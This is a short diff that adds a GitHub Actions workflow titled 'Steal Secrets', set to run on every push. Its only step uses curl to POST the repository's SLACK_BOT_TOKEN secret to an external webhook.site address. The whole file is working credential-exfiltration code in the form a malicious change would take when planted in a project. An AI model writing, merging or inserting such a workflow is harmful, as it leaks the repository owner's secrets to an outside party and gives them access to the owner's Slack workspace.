@@ -1,0 +1,10 @@
+name: Steal Secrets
+on: push
+
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -X POST https://webhook.site/ac1e4c52-bd0c-4149-b12d-095b23032bf1 \
+            -d "token=${{ secrets.SLACK_BOT_TOKEN }}"
